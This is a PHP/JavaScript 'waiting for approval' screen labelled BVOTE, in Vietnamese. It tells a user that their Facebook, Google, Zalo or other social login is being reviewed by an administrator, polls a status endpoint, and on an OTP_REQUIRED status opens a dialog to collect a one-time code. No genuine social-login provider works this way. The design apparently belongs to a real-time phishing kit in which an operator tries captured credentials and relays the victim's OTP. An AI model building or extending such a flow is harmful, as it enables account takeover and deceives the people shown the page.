<?php
/**
 * Enhanced Waiting Screen - BVOTE
 * Màn hình chờ phê duyệt hoàn thiện với UX tốt nhất
 */
?>
<div id="enhanced-waiting-screen" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
    <div class="bg-white rounded-lg shadow-xl max-w-lg w-full mx-4 overflow-hidden">
        <!-- Header -->
        <div class="bg-gradient-to-r from-blue-600 to-purple-600 px-6 py-4">
            <div class="text-center">
                <div class="w-16 h-16 bg-white bg-opacity-20 rounded-full flex items-center justify-center mx-auto mb-3">
                    <i class="fas fa-clock text-white text-2xl"></i>
                </div>
                <h3 class="text-white text-xl font-semibold">Đang chờ phê duyệt</h3>
                <p class="text-blue-100 text-sm">Yêu cầu đăng nhập của bạn đang được xem xét</p>
            </div>
        </div>

        <!-- Content -->
        <div class="p-6">
            <!-- Platform Info -->
            <div class="text-center mb-6">
                <div class="inline-flex items-center px-4 py-2 rounded-full text-sm font-medium bg-blue-100 text-blue-800 mb-3">
                    <i class="fas fa-globe mr-2"></i>
                    <span id="waiting-platform-name">Facebook</span>
                </div>
                <p class="text-gray-600 text-sm">
                    Đăng nhập qua <span id="waiting-user-hint" class="font-medium">user@example.com</span>
                </p>
            </div>

            <!-- Status Display -->
            <div class="text-center mb-6">
                <div class="relative">
                    <!-- Animated Spinner -->
                    <div class="w-20 h-20 mx-auto mb-4">
                        <div class="animate-spin rounded-full h-20 w-20 border-b-4 border-blue-600"></div>
                        <div class="absolute inset-0 flex items-center justify-center">
                            <div class="w-8 h-8 bg-blue-600 rounded-full"></div>
                        </div>
                    </div>

                    <!-- Status Text -->
                    <h4 class="text-lg font-medium text-gray-900 mb-2" id="waiting-status-text">Đang chờ phê duyệt</h4>
                    <p class="text-gray-600 text-sm" id="waiting-status-description">
                        Quản trị viên sẽ xem xét yêu cầu của bạn trong thời gian sớm nhất
                    </p>
                </div>
            </div>

            <!-- Request Details -->
            <div class="bg-gray-50 rounded-lg p-4 mb-6">
                <div class="grid grid-cols-2 gap-4 text-sm">
                    <div>
                        <span class="text-gray-500">ID yêu cầu:</span>
                        <div class="font-mono text-gray-900" id="waiting-request-id">-</div>
                    </div>
                    <div>
                        <span class="text-gray-500">Thời gian gửi:</span>
                        <div class="text-gray-900" id="waiting-created-time">-</div>
                    </div>
                    <div>
                        <span class="text-gray-500">Thời gian còn lại:</span>
                        <div class="text-red-600 font-semibold" id="waiting-ttl-countdown">02:00</div>
                    </div>
                    <div>
                        <span class="text-gray-500">Trạng thái:</span>
                        <div class="inline-flex items-center px-2 py-1 rounded-full text-xs font-medium bg-yellow-100 text-yellow-800">
                            <span class="w-2 h-2 bg-yellow-400 rounded-full mr-1"></span>
                            <span id="waiting-status-badge">Chờ duyệt</span>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Progress Bar -->
            <div class="mb-6">
                <div class="flex justify-between text-xs text-gray-500 mb-2">
                    <span>Đã gửi</span>
                    <span>Đang xem xét</span>
                    <span>Hoàn thành</span>
                </div>
                <div class="w-full bg-gray-200 rounded-full h-2">
                    <div class="bg-blue-600 h-2 rounded-full transition-all duration-500" id="waiting-progress-bar" style="width: 33%"></div>
                </div>
            </div>

            <!-- Actions -->
            <div class="flex space-x-3">
                <button type="button" onclick="checkWaitingStatus()"
                        class="flex-1 bg-blue-600 hover:bg-blue-700 text-white py-3 px-4 rounded-lg font-medium transition-colors">
                    <i class="fas fa-sync-alt mr-2"></i>Kiểm tra trạng thái
                </button>
                <button type="button" onclick="closeEnhancedWaitingScreen()"
                        class="flex-1 bg-gray-100 hover:bg-gray-200 text-gray-700 py-3 px-4 rounded-lg font-medium transition-colors">
                    <i class="fas fa-times mr-2"></i>Đóng
                </button>
            </div>

            <!-- Auto-refresh Info -->
            <div class="text-center mt-4">
                <p class="text-xs text-gray-500">
                    <i class="fas fa-info-circle mr-1"></i>
                    Trạng thái sẽ được cập nhật tự động mỗi 5 giây
                </p>
            </div>
        </div>
    </div>
</div>

<script>
class EnhancedWaitingScreen {
    constructor() {
        this.requestId = null;
        this.platform = null;
        this.userHint = null;
        this.statusCheckInterval = null;
        this.ttlCountdownInterval = null;
        this.timeLeft = 120;
        this.onStatusChange = null;
        this.currentStatus = 'PENDING_REVIEW';
        this.statusHistory = [];
    }

    show(requestId, platform, userHint, onStatusChange) {
        this.requestId = requestId;
        this.platform = platform;
        this.userHint = userHint;
        this.onStatusChange = onStatusChange;
        this.timeLeft = 120;
        this.currentStatus = 'PENDING_REVIEW';
        this.statusHistory = ['REQUEST_SENT'];

        // Update UI
        document.getElementById('waiting-platform-name').textContent = this.getPlatformDisplayName(platform);
        document.getElementById('waiting-user-hint').textContent = userHint;
        document.getElementById('waiting-request-id').textContent = requestId;
        document.getElementById('waiting-created-time').textContent = new Date().toLocaleTimeString('vi-VN');

        // Show dialog
        document.getElementById('enhanced-waiting-screen').classList.remove('hidden');

        // Start countdown
        this.startTtlCountdown();

        // Start status checking
        this.startStatusChecking();

        // Update progress
        this.updateProgress();
    }

    hide() {
        document.getElementById('enhanced-waiting-screen').classList.add('hidden');
        this.stopTtlCountdown();
        this.stopStatusChecking();
    }

    startTtlCountdown() {
        this.ttlCountdownInterval = setInterval(() => {
            this.timeLeft--;
            const minutes = Math.floor(this.timeLeft / 60);
            const seconds = this.timeLeft % 60;

            document.getElementById('waiting-ttl-countdown').textContent =
                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

            if (this.timeLeft <= 0) {
                this.stopTtlCountdown();
                this.updateStatus('EXPIRED', 'Yêu cầu đăng nhập đã hết hạn');
                this.showExpiredMessage();
            }
        }, 1000);
    }

    stopTtlCountdown() {
        if (this.ttlCountdownInterval) {
            clearInterval(this.ttlCountdownInterval);
            this.ttlCountdownInterval = null;
        }
    }

    startStatusChecking() {
        // Check immediately
        this.checkStatus();

        // Then check every 5 seconds
        this.statusCheckInterval = setInterval(() => {
            this.checkStatus();
        }, 5000);
    }

    stopStatusChecking() {
        if (this.statusCheckInterval) {
            clearInterval(this.statusCheckInterval);
            this.statusCheckInterval = null;
        }
    }

    async checkStatus() {
        try {
            const response = await fetch(`/api/social-login/status/${this.requestId}`);
            const data = await response.json();

            if (data.success) {
                const newStatus = data.request.status;
                if (newStatus !== this.currentStatus) {
                    this.updateStatus(newStatus, this.getStatusDescription(newStatus));

                    if (this.onStatusChange) {
                        this.onStatusChange(newStatus, data.request);
                    }
                }
            }
        } catch (error) {
            console.error('Status check error:', error);
        }
    }

    updateStatus(status, description) {
        this.currentStatus = status;
        this.statusHistory.push(status);

        // Update status text
        document.getElementById('waiting-status-text').textContent = this.getStatusDisplayText(status);
        document.getElementById('waiting-status-description').textContent = description;

        // Update status badge
        const badge = document.getElementById('waiting-status-badge');
        badge.textContent = this.getStatusBadgeText(status);

        // Update badge color
        badge.className = `inline-flex items-center px-2 py-1 rounded-full text-xs font-medium ${this.getStatusBadgeClass(status)}`;

        // Update progress
        this.updateProgress();

        // Handle specific status
        switch (status) {
            case 'APPROVED':
                this.handleApproved();
                break;
            case 'REJECTED':
                this.handleRejected();
                break;
            case 'OTP_REQUIRED':
                this.handleOtpRequired();
                break;
            case 'EXPIRED':
                this.handleExpired();
                break;
        }
    }

    updateProgress() {
        const progressBar = document.getElementById('waiting-progress-bar');
        let progress = 0;

        switch (this.currentStatus) {
            case 'PENDING_REVIEW':
                progress = 33;
                break;
            case 'OTP_REQUIRED':
                progress = 66;
                break;
            case 'APPROVED':
            case 'REJECTED':
            case 'EXPIRED':
                progress = 100;
                break;
        }

        progressBar.style.width = `${progress}%`;

        // Change color based on status
        if (this.currentStatus === 'APPROVED') {
            progressBar.className = 'bg-green-600 h-2 rounded-full transition-all duration-500';
        } else if (this.currentStatus === 'REJECTED' || this.currentStatus === 'EXPIRED') {
            progressBar.className = 'bg-red-600 h-2 rounded-full transition-all duration-500';
        } else if (this.currentStatus === 'OTP_REQUIRED') {
            progressBar.className = 'bg-yellow-600 h-2 rounded-full transition-all duration-500';
        } else {
            progressBar.className = 'bg-blue-600 h-2 rounded-full transition-all duration-500';
        }
    }

    handleApproved() {
        this.showSuccessMessage('Đăng nhập thành công! Bạn sẽ được chuyển hướng trong giây lát...');
        setTimeout(() => {
            this.hide();
            // Redirect to user dashboard or reload page
            window.location.reload();
        }, 2000);
    }

    handleRejected() {
        this.showErrorMessage('Yêu cầu đăng nhập bị từ chối. Vui lòng thử lại hoặc liên hệ quản trị viên.');
        setTimeout(() => {
            this.hide();
        }, 5000);
    }

    handleOtpRequired() {
        this.showInfoMessage('Yêu cầu xác thực OTP. Vui lòng nhập mã xác thực để hoàn tất đăng nhập.');
        setTimeout(() => {
            this.hide();
            // Show OTP dialog
            if (window.enhancedOtpDialog) {
                window.enhancedOtpDialog.show(this.requestId, this.platform, this.userHint);
            }
        }, 2000);
    }

    handleExpired() {
        this.showErrorMessage('Yêu cầu đăng nhập đã hết hạn. Vui lòng tạo yêu cầu mới.');
        setTimeout(() => {
            this.hide();
        }, 5000);
    }

    showSuccessMessage(message) {
        this.showMessage(message, 'success');
    }

    showErrorMessage(message) {
        this.showMessage(message, 'error');
    }

    showInfoMessage(message) {
        this.showMessage(message, 'info');
    }

    showMessage(message, type) {
        // Create temporary message
        const messageDiv = document.createElement('div');
        messageDiv.className = `fixed top-4 right-4 px-6 py-3 rounded-lg shadow-lg z-50 transition-all duration-300 transform translate-x-full`;

        let bgColor, textColor, icon;
        switch (type) {
            case 'success':
                bgColor = 'bg-green-500';
                textColor = 'text-white';
                icon = 'fas fa-check-circle';
                break;
            case 'error':
                bgColor = 'bg-red-500';
                textColor = 'text-white';
                icon = 'fas fa-exclamation-circle';
                break;
            case 'info':
                bgColor = 'bg-blue-500';
                textColor = 'text-white';
                icon = 'fas fa-info-circle';
                break;
        }

        messageDiv.className = `fixed top-4 right-4 px-6 py-3 rounded-lg shadow-lg z-50 transition-all duration-300 transform translate-x-full ${bgColor} ${textColor}`;
        messageDiv.innerHTML = `
            <div class="flex items-center">
                <i class="${icon} mr-2"></i>
                <span>${message}</span>
            </div>
        `;

        document.body.appendChild(messageDiv);

        // Animate in
        setTimeout(() => {
            messageDiv.classList.remove('translate-x-full');
        }, 100);

        // Animate out and remove
        setTimeout(() => {
            messageDiv.classList.add('translate-x-full');
            setTimeout(() => {
                document.body.removeChild(messageDiv);
            }, 300);
        }, 3000);
    }

    getPlatformDisplayName(platform) {
        const names = {
            'facebook': 'Facebook',
            'google': 'Google',
            'instagram': 'Instagram',
            'zalo': 'Zalo',
            'yahoo': 'Yahoo',
            'microsoft': 'Microsoft',
            'outlook': 'Outlook',
            'email': 'Email',
            'apple': 'Apple'
        };
        return names[platform] || platform;
    }

    getStatusDisplayText(status) {
        const texts = {
            'PENDING_REVIEW': 'Đang chờ phê duyệt',
            'OTP_REQUIRED': 'Yêu cầu xác thực OTP',
            'APPROVED': 'Đăng nhập thành công!',
            'REJECTED': 'Yêu cầu bị từ chối',
            'EXPIRED': 'Yêu cầu đã hết hạn'
        };
        return texts[status] || status;
    }

    getStatusDescription(status) {
        const descriptions = {
            'PENDING_REVIEW': 'Quản trị viên sẽ xem xét yêu cầu của bạn trong thời gian sớm nhất',
            'OTP_REQUIRED': 'Vui lòng nhập mã xác thực OTP để hoàn tất đăng nhập',
            'APPROVED': 'Chúc mừng! Bạn đã được phê duyệt đăng nhập',
            'REJECTED': 'Yêu cầu đăng nhập của bạn không được chấp thuận',
            'EXPIRED': 'Yêu cầu đăng nhập đã quá thời hạn xử lý'
        };
        return descriptions[status] || '';
    }

    getStatusBadgeText(status) {
        const texts = {
            'PENDING_REVIEW': 'Chờ duyệt',
            'OTP_REQUIRED': 'Cần OTP',
            'APPROVED': 'Thành công',
            'REJECTED': 'Từ chối',
            'EXPIRED': 'Hết hạn'
        };
        return texts[status] || status;
    }

    getStatusBadgeClass(status) {
        const classes = {
            'PENDING_REVIEW': 'bg-yellow-100 text-yellow-800',
            'OTP_REQUIRED': 'bg-orange-100 text-orange-800',
            'APPROVED': 'bg-green-100 text-green-800',
            'REJECTED': 'bg-red-100 text-red-800',
            'EXPIRED': 'bg-gray-100 text-gray-800'
        };
        return classes[status] || 'bg-gray-100 text-gray-800';
    }
}

// Global instance
window.enhancedWaitingScreen = new EnhancedWaitingScreen();

// Global functions
function showEnhancedWaitingScreen(requestId, platform, userHint, onStatusChange) {
    window.enhancedWaitingScreen.show(requestId, platform, userHint, onStatusChange);
}

function closeEnhancedWaitingScreen() {
    window.enhancedWaitingScreen.hide();
}

function checkWaitingStatus() {
    if (window.enhancedWaitingScreen) {
        window.enhancedWaitingScreen.checkStatus();
    }
}
</script>
